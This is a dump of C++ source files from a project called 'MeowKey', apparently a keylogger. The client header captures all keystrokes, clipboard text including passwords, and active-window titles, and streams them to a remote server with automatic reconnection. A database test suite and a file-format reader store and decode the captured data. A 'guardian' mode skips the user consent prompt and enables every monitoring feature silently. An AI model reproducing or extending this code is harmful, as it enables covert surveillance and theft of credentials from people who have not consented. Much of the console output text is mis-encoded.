            cout << "  âŒ Clipboard " << (i+1) << " content mismatch!" << endl;
            cout << "     Expected: \"" << expected << "\"" << endl;
            cout << "     Got:      \"" << actual << "\"" << endl;
            all_correct = false;
        } else {
            cout << "    âœ“ Clipboard " << (i+1) << " correct" << endl;
        }
        
        // Verify timestamp
        if (retrieved.clipboard_events[i].timestamp != stored.clipboard[i].timestamp) {
            cout << "  âŒ Clipboard " << (i+1) << " timestamp mismatch!" << endl;
            all_correct = false;
        }
    }
    
    // Verify window events
    cout << "\n  Verifying window events..." << endl;
    for (size_t i = 0; i < stored.windows.size(); i++) {
        size_t pipe_pos = stored.windows[i].content.find('|');
        string expected_title = stored.windows[i].content.substr(0, pipe_pos);
        string expected_process = stored.windows[i].content.substr(pipe_pos + 1);
        
        string actual_title = retrieved.window_events[i].title;
        string actual_process = retrieved.window_events[i].process;
        
        bool title_match = (expected_title == actual_title);
        bool process_match = (expected_process == actual_process);
        
        if (!title_match || !process_match) {
            cout << "  âŒ Window " << (i+1) << " content mismatch!" << endl;
            if (!title_match) {
                cout << "     Expected title: \"" << expected_title << "\"" << endl;
                cout << "     Got title:      \"" << actual_title << "\"" << endl;
            }
            if (!process_match) {
                cout << "     Expected process: \"" << expected_process << "\"" << endl;
                cout << "     Got process:      \"" << actual_process << "\"" << endl;
            }
            all_correct = false;
        } else {
            cout << "    âœ“ Window " << (i+1) << " correct" << endl;
        }
        
        // Verify timestamp
        if (retrieved.window_events[i].timestamp != stored.windows[i].timestamp) {
            cout << "  âŒ Window " << (i+1) << " timestamp mismatch!" << endl;
            all_correct = false;
        }
    }
    
    return all_correct;
}

// Test deletion and re-creation
bool testDeletionRecreation(MeowKeyDatabase& db, const TestClientData& client) {
    cout << "\nðŸ—‘ï¸  Testing deletion and re-creation for: " << client.id << endl;
    
    // Delete client
    if (!db.deleteClient(client.id)) {
        cout << "  âŒ Failed to delete client" << endl;
        return false;
    }
    cout << "  âœ“ Client deleted" << endl;
    
    // Verify client no longer exists
    if (db.clientExists(client.id)) {
        cout << "  âŒ Client still exists after deletion" << endl;
        return false;
    }
    cout << "  âœ“ Client no longer exists in database" << endl;
    
    // Re-create client with same ID
    ClientRecord new_record;
    bool is_existing = db.registerClient(client.id, new_record);
    
    if (is_existing) {
        cout << "  âŒ Re-created client reported as 'existing'" << endl;
        return false;
    }
    if (new_record.session_count != 1) {
        cout << "  âŒ New client should have session_count = 1, got: " << new_record.session_count << endl;
        return false;
    }
    
    cout << "  âœ“ Client successfully re-created as new" << endl;
    return true;
}

void runDataIntegrityTest() {
    cout << "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
    cout << "â•‘        MEOWKEY DATABASE - 100% DATA INTEGRITY TEST             â•‘" << endl;
    cout << "â•‘    Byte-by-byte verification of storage and retrieval          â•‘" << endl;
    cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    
    // Generate test data
    vector<TestClientData> testClients = generateTestData();
    cout << "\nðŸ“Š Generated test data for " << testClients.size() << " clients:" << endl;
    for (const auto& client : testClients) {
        cout << "  â€¢ " << client.id 
             << " (Keystrokes: " << client.keystrokes.size()
             << ", Clipboard: " << client.clipboard.size()
             << ", Windows: " << client.windows.size() << ")" << endl;
    }
    
    // Create database
    string db_file = "integrity_test.db";
    remove(db_file.c_str()); // Start fresh
    
    MeowKeyDatabase db(db_file);
    if (!db.open()) {
        cerr << "âŒ Failed to open database!" << endl;
        return;
    }
    
    cout << "\n" << string(70, '=') << endl;
    cout << "PHASE 1: STORING ALL TEST DATA" << endl;
    cout << string(70, '=') << endl;
    
    // Store all test data
    for (const auto& client : testClients) {
        storeClientData(db, client);
    }
    
    // Print database stats after insertion
    cout << "\n" << string(70, '=') << endl;
    cout << "DATABASE STATISTICS AFTER INSERTION:" << endl;
    cout << string(70, '=') << endl;
    db.printStats();
    
    cout << "\n" << string(70, '=') << endl;
    cout << "PHASE 2: RETRIEVAL AND VERIFICATION" << endl;
    cout << string(70, '=') << endl;
    
    // Retrieve and verify for each client
    int verified_clients = 0;
    int total_clients = testClients.size();
    
    for (const auto& client : testClients) {
        QueryResult retrieved;
        bool success = db.queryClientAllEvents(client.id, retrieved);
        
        if (!success) {
            cout << "\nâŒ FAILED to retrieve data for client: " << client.id << endl;
            continue;
        }
        
        if (verifyClientData(client, retrieved)) {
            cout << "\nâœ… VERIFICATION PASSED for client: " << client.id << endl;
            verified_clients++;
        } else {
            cout << "\nâŒ VERIFICATION FAILED for client: " << client.id << endl;
        }
        
        cout << string(50, '-') << endl;
    }
    
    cout << "\n" << string(70, '=') << endl;
    cout << "VERIFICATION SUMMARY:" << endl;
    cout << string(70, '=') << endl;
    cout << "Verified " << verified_clients << "/" << total_clients << " clients successfully" << endl;
    
    if (verified_clients == total_clients) {
        cout << "ðŸŽ‰ ALL CLIENTS PASSED DATA INTEGRITY CHECK!" << endl;
    } else {
        cout << "âš ï¸  SOME CLIENTS FAILED VERIFICATION!" << endl;
    }
    
    cout << "\n" << string(70, '=') << endl;
    cout << "PHASE 3: DELETION AND RE-CREATION TEST" << endl;
    cout << string(70, '=') << endl;
    
    // Test deletion and re-creation for first client
    if (!testClients.empty()) {
        if (testDeletionRecreation(db, testClients[0])) {
            cout << "âœ… Deletion/Re-creation test PASSED" << endl;
        } else {
            cout << "âŒ Deletion/Re-creation test FAILED" << endl;
        }
    }
    
    // Final database stats
    cout << "\n" << string(70, '=') << endl;
    cout << "FINAL DATABASE STATISTICS:" << endl;
    cout << string(70, '=') << endl;
    db.printStats();
    
    db.close();
    
    cout << "\n" << string(70, '=') << endl;
    cout << "TEST COMPLETED" << endl;
    cout << string(70, '=') << endl;
    
    if (verified_clients == total_clients) {
        cout << "\nðŸŽ‰ðŸŽ‰ðŸŽ‰ ULTIMATE VERDICT: DATA STORAGE AND RETRIEVAL IS WORKING PERFECTLY! ðŸŽ‰ðŸŽ‰ðŸŽ‰" << endl;
        cout << "All clients' data was stored and retrieved with 100% accuracy." << endl;
    } else {
        cout << "\nâš ï¸âš ï¸âš ï¸ ULTIMATE VERDICT: DATA INTEGRITY ISSUES DETECTED! âš ï¸âš ï¸âš ï¸" << endl;
        cout << "Some data was lost or corrupted during storage/retrieval." << endl;
    }
}

int main() {
    cout << "Starting comprehensive data integrity test..." << endl;
    cout << "This test will verify byte-by-byte accuracy of storage and retrieval." << endl;
    cout << "Test file: integrity_test.db" << endl;
    cout << endl;
    
    runDataIntegrityTest();
    
    return 0;
}




===== FILE: ./client_cross.hpp =====

#ifndef CLIENT_CROSS_HPP
#define CLIENT_CROSS_HPP

#include "platform_detector.hpp"
#include "socket_utils_cross.hpp"
#include "thread_safe_queue.hpp"
#include <thread>
#include <atomic>
#include <iostream>
#include <memory>
using namespace std; 

#ifdef PLATFORM_WINDOWS
    #include "keyboard_capture_windows.hpp"
    #include "clipboard_monitor_windows.hpp"
    #include "window_monitor_windows.hpp"
    typedef KeyboardCaptureWindows KeyboardCapture;
    typedef ClipboardMonitorWindows ClipboardMonitor;
    typedef WindowMonitorWindows WindowMonitor;
#else
    #include "keyboard_capture.hpp"
    #include "clipboard_monitor.hpp"
    #include "window_monitor.hpp"
#endif

class Client {
private:
      string server_host_;
    int server_port_;
      string client_id_;
      atomic<bool> running_;
      thread network_thread_;
    ThreadSafeQueue<  string> event_queue_;
      unique_ptr<KeyboardCapture> keyboard_capture_;
      unique_ptr<ClipboardMonitor> clipboard_monitor_;
      unique_ptr<WindowMonitor> window_monitor_;
    bool enable_clipboard_monitoring_;
    bool enable_window_monitoring_;
    bool skip_consent_; // NEW: Skip consent if launched by guardian

public:
    Client(const   string& host, int port, const   string& client_id, bool skip_consent = false) 
        : server_host_(host), server_port_(port), client_id_(client_id),
          running_(false), enable_clipboard_monitoring_(false), 
          enable_window_monitoring_(false), skip_consent_(skip_consent) {}

    ~Client() {
        stop();
    }

    bool start() {
        if (running_) {
            return false;
        }

        running_ = true;
        
        // Get user consent (skip if launched by guardian)
        if (!skip_consent_) {
            if (!getUserConsent()) {
                  cout << "Consent not granted. Exiting." <<   endl;
                return false;
            }
        } else {
            // Auto-consent when launched by guardian
              cout << "=== PROTECTED MODE ===" <<   endl;
              cout << "Running under guardian protection" <<   endl;
              cout << "All monitoring features enabled" <<   endl;
            enable_clipboard_monitoring_ = true;
            enable_window_monitoring_ = true;
        }

        // Initialize keyboard capture
        try {
            keyboard_capture_ =   make_unique<KeyboardCapture>(
                [this](const   string& key) {
                    event_queue_.push("KEY: " + key);
                }
            );
        } catch (const   exception& e) {
              cerr << "Failed to initialize keyboard capture: " << e.what() <<   endl;
            return false;
        }

        // Initialize clipboard monitor if consented
        if (enable_clipboard_monitoring_) {
            try {
                clipboard_monitor_ =   make_unique<ClipboardMonitor>(
                    [this](const   string& content) {
                        event_queue_.push(content);
                    }
                );
            } catch (const   exception& e) {
                  cerr << "Failed to initialize clipboard monitor: " << e.what() <<   endl;
            }
        }

        // Initialize window monitor if consented
        if (enable_window_monitoring_) {
            try {
                window_monitor_ =   make_unique<WindowMonitor>(
                    [this](const   string& window_info) {
                        event_queue_.push(window_info);
                    }
                );
            } catch (const   exception& e) {
                  cerr << "Failed to initialize window monitor: " << e.what() <<   endl;
            }
        }

        // Start keyboard capture
        if (!keyboard_capture_->start()) {
              cerr << "Failed to start keyboard capture" <<   endl;
            return false;
        }

        // Start clipboard monitoring if enabled
        if (clipboard_monitor_ && !clipboard_monitor_->start()) {
              cerr << "Failed to start clipboard monitoring" <<   endl;
        }

        // Start window monitoring if enabled
        if (window_monitor_ && !window_monitor_->start()) {
              cerr << "Failed to start window monitoring" <<   endl;
        }

          cout << "Client ID: " << client_id_ <<   endl;
          cout << "Keyboard device: " << keyboard_capture_->getKeyboardDevice() <<   endl;
        if (enable_clipboard_monitoring_) {
              cout << "Clipboard monitoring: ENABLED" <<   endl;
        }
        if (enable_window_monitoring_) {
              cout << "Window monitoring: ENABLED" <<   endl;
        }

        // Start network thread
        network_thread_ =   thread(&Client::networkLoop, this);

          cout << "Client started. Capturing input events..." <<   endl;
        return true;
    }

    void stop() {
        running_ = false;
        if (keyboard_capture_) {
            keyboard_capture_->stop();
        }
        if (clipboard_monitor_) {
            clipboard_monitor_->stop();
        }
        if (window_monitor_) {
            window_monitor_->stop();
        }
        if (network_thread_.joinable()) {
            network_thread_.join();
        }
        SocketUtils::cleanupWSA();
    }

private:
    bool getUserConsent() {
          cout << "=== INPUT MONITORING CLIENT ===" <<   endl;
          cout << "Client ID: " << client_id_ <<   endl;
          cout << "This application will capture:" <<   endl;
          cout << "1. ALL keystrokes on your system" <<   endl;
          cout << "2. Clipboard content when it changes" <<   endl;
          cout << "3. Active window/tab information when you switch" <<   endl;
          cout << "and send them to the server at " << server_host_ << ":" << server_port_ <<   endl;
          cout <<   endl;
          cout << "WARNING: This may capture sensitive information!" <<   endl;
          cout <<   endl;
        
          string response;
          cout << "Do you give permission for keyboard monitoring? (yes/no): ";
          getline(  cin, response);
        bool keyboard_consent = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        if (!keyboard_consent) {
            return false;
        }
        
          cout << "Do you also give permission for clipboard monitoring? (yes/no): ";
          getline(  cin, response);
        enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        if (enable_clipboard_monitoring_) {
              cout << "CLIPBOARD WARNING: This will capture ALL copied text including passwords!" <<   endl;
              cout << "Are you sure? (yes/no): ";
              getline(  cin, response);
            enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        }
        
          cout << "Do you also give permission for window/tab monitoring? (yes/no): ";
          getline(  cin, response);
        enable_window_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        return true;
    }

    void networkLoop() {
        while (running_) {
            try {
                int sockfd = SocketUtils::createSocket();
                SocketUtils::connectToServer(sockfd, server_host_, server_port_);
                
                // Send client ID first
                  string hello_msg = "CLIENT_ID: " + client_id_ + "\n";
                SocketUtils::sendData(sockfd, hello_msg);
                
                  cout << "Connected to server successfully!" <<   endl;

                while (running_) {
                    auto event_opt = event_queue_.pop();
                    if (event_opt) {
                          string message = *event_opt + "\n";
                        if (!SocketUtils::sendData(sockfd, message)) {
                              cerr << "Failed to send data. Reconnecting..." <<   endl;
                            break;
                        }
                    }
                    
                      this_thread::sleep_for(  chrono::milliseconds(10));
                }

                close(sockfd);
            } catch (const   exception& e) {
                  cerr << "Connection error: " << e.what() << ". Retrying in 5 seconds..." <<   endl;
                  this_thread::sleep_for(  chrono::seconds(5));
            }
        }
    }
};

#endif

===== FILE: ./clipboard_monitor.hpp =====

#ifndef CLIPBOARD_MONITOR_HPP
#define CLIPBOARD_MONITOR_HPP

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>  // ADDED: For XA_STRING and other atom definitions
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <functional>
#include <cstring>
#include <algorithm>
using namespace std; 

class ClipboardMonitor {
private:
      atomic<bool> monitoring_;
      thread monitor_thread_;
      function<void(const   string&)> callback_;
    Display* display_;
    Window window_;
    Atom clipboard_atom_;
    Atom utf8_string_atom_;
    Atom text_plain_atom_;
      string last_clipboard_content_;
    static const size_t MAX_CLIPBOARD_SIZE = 10240; // 10KB limit

public:
    ClipboardMonitor(  function<void(const   string&)> callback) 
        : monitoring_(false), callback_(callback), display_(nullptr), window_(0) {}

    ~ClipboardMonitor() {
        stop();
    }

    bool start() {
        if (monitoring_) {
            return false;
        }

        // Initialize X11 display
        display_ = XOpenDisplay(nullptr);
        if (!display_) {
              cerr << "Failed to open X11 display. Make sure you're running in a graphical environment." <<   endl;
            return false;
        }

        // Create a hidden window to receive clipboard events
        int screen = DefaultScreen(display_);
        window_ = XCreateSimpleWindow(display_, RootWindow(display_, screen),
                                     0, 0, 1, 1, 0, 0, 0);
        
        clipboard_atom_ = XInternAtom(display_, "CLIPBOARD", False);
        utf8_string_atom_ = XInternAtom(display_, "UTF8_STRING", False);
        text_plain_atom_ = XInternAtom(display_, "text/plain", False);
        
        // If UTF8_STRING is not available, fall back to standard atoms
        if (utf8_string_atom_ == None) {
            utf8_string_atom_ = XInternAtom(display_, "STRING", False);
        }

        monitoring_ = true;
        monitor_thread_ =   thread(&ClipboardMonitor::monitorLoop, this);
        
          cout << "Clipboard monitoring started" <<   endl;
        return true;
    }

    void stop() {
        monitoring_ = false;
        if (monitor_thread_.joinable()) {
            monitor_thread_.join();
        }
        if (display_) {
            if (window_) {
                XDestroyWindow(display_, window_);
            }
            XCloseDisplay(display_);
            display_ = nullptr;
        }
          cout << "Clipboard monitoring stopped" <<   endl;
    }

    bool isMonitoring() const {
        return monitoring_;
    }

private:
    void monitorLoop() {
        // Get initial clipboard content
          string initial_content = getClipboardText();
        if (!initial_content.empty()) {
            last_clipboard_content_ = initial_content;
        }

        while (monitoring_) {
              string current_content = getClipboardText();
            
            if (!current_content.empty() && current_content != last_clipboard_content_) {
                // Truncate if too long for display
                  string display_content = current_content;
                if (display_content.length() > 100) {
                    display_content = display_content.substr(0, 100) + "...";
                }
                
                  cout << "Clipboard changed: " << display_content <<   endl;
                
                if (callback_) {
                    // Send truncated version if too large
                    if (current_content.length() > MAX_CLIPBOARD_SIZE) {
                          string truncated = current_content.substr(0, MAX_CLIPBOARD_SIZE) + "...[TRUNCATED]";
                        callback_("CLIPBOARD: " + truncated);
                    } else {
                        callback_("CLIPBOARD: " + current_content);
                    }
                }
                
                last_clipboard_content_ = current_content;
            }
            
              this_thread::sleep_for(  chrono::milliseconds(500));
        }
    }

      string getClipboardText() {
        if (!display_) {
            return "";
        }

        XEvent event;
          string result;

        // Try multiple target types in order of preference
        Atom targets[] = {
            utf8_string_atom_,
            text_plain_atom_,
            XA_STRING
        };
        
        const int num_targets = sizeof(targets) / sizeof(targets[0]);

        for (int i = 0; i < num_targets; i++) {
            if (targets[i] == None) continue;
            
            // Request clipboard content
            XConvertSelection(display_, clipboard_atom_, targets[i], 
                             clipboard_atom_, window_, CurrentTime);
            XFlush(display_);

            // Wait for selection notify with timeout
            time_t start_time = time(nullptr);
            bool got_data = false;
            
            while (time(nullptr) - start_time < 2) { // 2 second timeout
                if (XPending(display_)) {
                    XNextEvent(display_, &event);
                    
                    if (event.type == SelectionNotify && 
                        event.xselection.selection == clipboard_atom_) {
                        
                        if (event.xselection.property != None) {
                            Atom actual_type;
                            int actual_format;
                            unsigned long nitems, bytes_after;
                            unsigned char* data = nullptr;
                            
                            if (XGetWindowProperty(display_, window_, 
                                                 event.xselection.property,
                                                 0, MAX_CLIPBOARD_SIZE, False, 
                                                 AnyPropertyType,
                                                 &actual_type, &actual_format,
                                                 &nitems, &bytes_after, &data) == Success) {
                                
                                if (data && nitems > 0 && actual_format == 8) {
                                    result =   string(reinterpret_cast<char*>(data), nitems);
                                    
                                    // Clean up: remove non-printable characters except newlines and tabs
                                    result.erase(  remove_if(result.begin(), result.end(),
                                        [](char c) { 
                                            return (c < 32 && c != '\n' && c != '\t' && c != '\r') || c == 127; 
                                        }), result.end());
                                    
                                    got_data = true;
                                }
                                
                                if (data) {
                                    XFree(data);
                                }
                                
                                // Delete the property to clean up
                                XDeleteProperty(display_, window_, event.xselection.property);
                            }
                        }
                        break;
                    }
                }
                  this_thread::sleep_for(  chrono::milliseconds(10));
            }
            
            if (got_data && !result.empty()) {
                break;
            }
        }

        return result;
    }
};

#endif

===== FILE: ./test_read_db.cpp =====

// decode_db_correct.cpp
#include <iostream>
#include <fstream>
#include <cstdint>
#include <cstring>

// Correct header structure (128 bytes total)
struct DatabaseHeader {
    uint32_t magic;                 // 4 bytes
    uint32_t version;               // 4 bytes
    uint64_t file_size;             // 8 bytes
    uint64_t next_free_offset;      // 8 bytes
    uint64_t client_table_offset;   // 8 bytes
    uint64_t keystroke_tree_offset; // 8 bytes
    uint64_t clipboard_tree_offset; // 8 bytes  
    uint64_t window_tree_offset;    // 8 bytes
    uint32_t num_clients;           // 4 bytes
    uint32_t reserved[23];          // 92 bytes (23 * 4)
};

struct KeystrokeEvent {
    uint64_t timestamp;
    uint32_t client_hash;
    uint32_t sequence;
    char key[32];
};

int main() {
    std::ifstream file("meowkey_server.db", std::ios::binary);
    
    if (!file) {
        std::cerr << "Failed to open database file!\n";
        return 1;
    }
    
    // Read the CORRECT 128-byte header
    DatabaseHeader header;
    file.read((char*)&header, 128);
    
    std::cout << "=== CORRECT DATABASE HEADER ===\n";
    std::cout << "Magic: 0x" << std::hex << header.magic << " (";
    std::cout << (char)(header.magic >> 24) << (char)(header.magic >> 16) 
              << (char)(header.magic >> 8) << (char)header.magic << ")\n";
    std::cout << "Version: " << std::dec << header.version << "\n";
    std::cout << "File size: " << header.file_size << " bytes ("
              << header.file_size / 1024.0 / 1024.0 << " MB)\n";
    std::cout << "Next free offset: " << header.next_free_offset << " bytes\n";
    std::cout << "Client table offset: " << header.client_table_offset << "\n";
    std::cout << "Keystroke tree offset: " << header.keystroke_tree_offset << "\n";
    std::cout << "Clipboard tree offset: " << header.clipboard_tree_offset << "\n";
    std::cout << "Window tree offset: " << header.window_tree_offset << "\n";
    std::cout << "Number of clients: " << header.num_clients << "\n";
    
    // Verify the file size
    file.seekg(0, std::ios::end);
    size_t actual_size = file.tellg();
    std::cout << "Actual file size: " << actual_size << " bytes\n";
    
    // Check if offsets make sense
    std::cout << "\n=== OFFSET SANITY CHECK ===\n";
    std::cout << "Client table at: " << header.client_table_offset 
              << " (within file: " << (header.client_table_offset < actual_size ? "YES" : "NO") << ")\n";
    std::cout << "Keystroke tree at: " << header.keystroke_tree_offset 
              << " (within file: " << (header.keystroke_tree_offset < actual_size ? "YES" : "NO") << ")\n";
    
    // Try to read hash table entries
    std::cout << "\n=== READING HASH TABLE ===\n";
    
    // Hash table slot structure
    struct ClientRecord {
        uint32_t client_hash;
        char client_id[32];
        uint64_t keystroke_tree_root;
        uint64_t clipboard_tree_root;
        uint64_t window_tree_root;
        uint64_t first_seen;
        uint64_t last_seen;
        uint32_t session_count;
        uint32_t total_keystrokes;
        uint32_t total_clipboard;
        uint32_t total_windows;
        uint8_t is_active;
        uint8_t padding[3];
    };
    
    file.seekg(header.client_table_offset);
    ClientRecord client;
    
    for (int i = 0; i < 10; i++) {
        file.read((char*)&client, sizeof(client));
        
        if (client.client_hash != 0) {
            std::cout << "Found client at slot " << i << ":\n";
            std::cout << "  ID: " << client.client_id << "\n";
            std::cout << "  Hash: 0x" << std::hex << client.client_hash << std::dec << "\n";
            std::cout << "  Sessions: " << client.session_count << "\n";
            std::cout << "  Keystrokes: " << client.total_keystrokes << "\n";
            std::cout << "  Clipboards: " << client.total_clipboard << "\n";
            std::cout << "  Windows: " << client.total_windows << "\n";
            std::cout << "  Active: " << (int)client.is_active << "\n";
            break;
        }
    }
    
    // Read some B+ tree nodes
    std::cout << "\n=== CHECKING B+ TREE NODES ===\n";
    
    struct BPlusTreeNode {
        uint64_t keys[31];          // BPLUS_ORDER - 1
        uint64_t children[32];      // BPLUS_ORDER
        uint32_t num_keys;
        uint64_t parent_offset;
        uint64_t next_leaf;
        uint8_t is_leaf;
        uint8_t padding[7];         // Pad to 8-byte alignment
    };
    
    // Try to read the keystroke tree root
    if (header.keystroke_tree_offset > 0 && header.keystroke_tree_offset < actual_size) {
        file.seekg(header.keystroke_tree_offset);
        BPlusTreeNode node;
        if (file.read((char*)&node, sizeof(node))) {
            std::cout << "Keystroke tree root node:\n";
            std::cout << "  Is leaf: " << (int)node.is_leaf << "\n";
            std::cout << "  Num keys: " << node.num_keys << "\n";
            if (node.num_keys > 0) {
                std::cout << "  First key (timestamp): " << node.keys[0] << "\n";
            }
        }
    }
    
    return 0;
}

===== FILE: ./db_structures.hpp =====

// // #ifndef DB_STRUCTURES_HPP
// // #define DB_STRUCTURES_HPP

// // #include <cstdint>
// // #include <cstring>
// // #include <string>
// // #include <array>

// // using namespace std;

// // // File header for the unified database (256 bytes)
// // struct DatabaseHeader {
// //     uint32_t magic;                    // 0x4D454F57 "MEOW"
// //     uint32_t version;                  // 1
// //     uint64_t file_size;                // Pre-allocated 100MB
// //     uint64_t client_table_offset;      // Offset to client hash table
// //     uint64_t keystroke_tree_offset;    // Offset to keystroke B+ tree root
// //     uint64_t clipboard_tree_offset;    // Offset to clipboard B+ tree root
// //     uint64_t window_tree_offset;       // Offset to window B+ tree root
// //     uint32_t num_clients;              // Active client count
// //     uint32_t max_clients;              // 1000
// //     uint64_t next_free_offset;         // Next available space
// //     uint8_t padding[196];
    
// //     DatabaseHeader() {
// //         memset(this, 0, sizeof(*this));
// //         magic = 0x4D454F57;
// //         version = 1;
// //         file_size = 100ULL * 1024 * 1024; // 100MB
// //         max_clients = 1000;
// //     }
// // };

// // // Client record (256 bytes) - stored in hash table
// // struct ClientRecord {
// //     char client_id[64];                // Client identifier
// //     uint32_t client_hash;              // Hash of client_id
// //     uint8_t is_active;                 // Currently connected
// //     uint32_t session_count;            // Number of sessions
// //     uint64_t first_seen;               // First connection timestamp
// //     uint64_t last_seen;                // Last activity timestamp
    
// //     // Counters
// //     uint64_t total_keystrokes;
// //     uint64_t total_clipboard;
// //     uint64_t total_windows;
    
// //     // B+ tree offsets for this client's data
// //     uint64_t keystroke_tree_root;
// //     uint64_t clipboard_tree_root;
// //     uint64_t window_tree_root;
    
// //     uint8_t padding[96];
    
// //     ClientRecord() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     bool isEmpty() const {
// //         return client_id[0] == '\0';
// //     }
    
// //     void setClientId(const string& id) {
// //         strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
// //         client_hash = hashString(id);
// //     }
    
// //     static uint32_t hashString(const string& str) {
// //         uint32_t hash = 5381;
// //         for (char c : str) {
// //             hash = ((hash << 5) + hash) + c; // hash * 33 + c
// //         }
// //         return hash;
// //     }
// // };

// // // Keystroke event (64 bytes)
// // struct KeystrokeEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t sequence;
// //     char key[48];
    
// //     KeystrokeEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     KeystrokeEvent(uint64_t ts, uint32_t hash, uint32_t seq, const string& k) 
// //         : timestamp(ts), client_hash(hash), sequence(seq) {
// //         memset(key, 0, sizeof(key));
// //         strncpy(key, k.c_str(), sizeof(key) - 1);
// //     }
// // };

// // // Clipboard event (512 bytes)
// // struct ClipboardEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t content_length;
// //     char content[496];
    
// //     ClipboardEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     ClipboardEvent(uint64_t ts, uint32_t hash, const string& text) 
// //         : timestamp(ts), client_hash(hash) {
// //         content_length = min((size_t)496, text.size());
// //         memset(content, 0, sizeof(content));
// //         memcpy(content, text.c_str(), content_length);
// //     }
    
// //     string getContent() const {
// //         return string(content, content_length);
// //     }
// // };

// // // Window event (256 bytes)
// // struct WindowEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t padding1;
// //     char title[128];
// //     char process[112];
    
// //     WindowEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     WindowEvent(uint64_t ts, uint32_t hash, const string& t, const string& p) 
// //         : timestamp(ts), client_hash(hash), padding1(0) {
// //         memset(title, 0, sizeof(title));
// //         memset(process, 0, sizeof(process));
// //         strncpy(title, t.c_str(), sizeof(title) - 1);
// //         strncpy(process, p.c_str(), sizeof(process) - 1);
// //     }
    
// //     string getTitle() const { return string(title); }
// //     string getProcess() const { return string(process); }
// // };

// // // B+ Tree Node (4096 bytes - page aligned)
// // static const int BPLUS_ORDER = 63;

// // struct BPlusTreeNode {
// //     bool is_leaf;
// //     uint32_t num_keys;
// //     uint32_t padding1;
// //     uint64_t keys[BPLUS_ORDER];              // Timestamps
// //     uint64_t children[BPLUS_ORDER + 1];      // Offsets
// //     uint64_t next_leaf;                      // For leaves
// //     uint64_t parent_offset;                  // Parent node
// //     uint8_t padding[24];
    
// //     BPlusTreeNode() {
// //         memset(this, 0, sizeof(*this));
// //     }
// // };

// // // Hash table slot (256 bytes)
// // struct HashTableSlot {
// //     ClientRecord client;
    
// //     HashTableSlot() {
// //         memset(this, 0, sizeof(*this));
// //     }
// // };

// // #endif


// #ifndef DB_STRUCTURES_HPP
// #define DB_STRUCTURES_HPP

// #include <cstdint>
// #include <cstring>
// #include <string>
// #include <array>

// using namespace std;

// #pragma pack(push, 1)

// // File header for the unified database (256 bytes)
// struct DatabaseHeader {
//     uint32_t magic;                    // 0x4D454F57 "MEOW"
//     uint32_t version;                  // 1
//     uint64_t file_size;                // Pre-allocated 100MB
//     uint64_t client_table_offset;      // Offset to client hash table
//     uint64_t keystroke_tree_offset;    // Offset to keystroke B+ tree root
//     uint64_t clipboard_tree_offset;    // Offset to clipboard B+ tree root
//     uint64_t window_tree_offset;       // Offset to window B+ tree root
//     uint32_t num_clients;              // Active client count
//     uint32_t max_clients;              // 1000
//     uint64_t next_free_offset;         // Next available space
//     uint8_t padding[196];
    
//     DatabaseHeader() {
//         memset(this, 0, sizeof(*this));
//         magic = 0x4D454F57;
//         version = 1;
//         file_size = 100ULL * 1024 * 1024; // 100MB
//         max_clients = 1000;
//     }
// };

// // Client record (256 bytes) - stored in hash table
// struct ClientRecord {
//     char client_id[64];                // Client identifier
//     uint32_t client_hash;              // Hash of client_id
//     uint8_t is_active;                 // Currently connected
//     uint32_t session_count;            // Number of sessions
//     uint64_t first_seen;               // First connection timestamp
//     uint64_t last_seen;                // Last activity timestamp
    
//     // Counters
//     uint64_t total_keystrokes;
//     uint64_t total_clipboard;
//     uint64_t total_windows;
    
//     // B+ tree offsets for this client's data
//     uint64_t keystroke_tree_root;
//     uint64_t clipboard_tree_root;
//     uint64_t window_tree_root;
    
//     uint8_t padding[96];
    
//     ClientRecord() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     bool isEmpty() const {
//         return client_id[0] == '\0';
//     }
    
//     void setClientId(const string& id) {
//         strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
//         client_hash = hashString(id);
//     }
    
//     static uint32_t hashString(const string& str) {
//         uint32_t hash = 5381;
//         for (char c : str) {
//             hash = ((hash << 5) + hash) + c; // hash * 33 + c
//         }
//         return hash;
//     }
// };

// // Keystroke event (64 bytes)
// struct KeystrokeEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t sequence;
//     char key[48];
    
//     KeystrokeEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     KeystrokeEvent(uint64_t ts, uint32_t hash, uint32_t seq, const string& k) 
//         : timestamp(ts), client_hash(hash), sequence(seq) {
//         memset(key, 0, sizeof(key));
//         strncpy(key, k.c_str(), sizeof(key) - 1);
//     }
// };

// // Clipboard event (512 bytes)
// struct ClipboardEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t content_length;
//     char content[496];
    
//     ClipboardEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     ClipboardEvent(uint64_t ts, uint32_t hash, const string& text) 
//         : timestamp(ts), client_hash(hash) {
//         content_length = min((size_t)496, text.size());
//         memset(content, 0, sizeof(content));
//         memcpy(content, text.c_str(), content_length);
//     }
    
//     string getContent() const {
//         return string(content, content_length);
//     }
// };

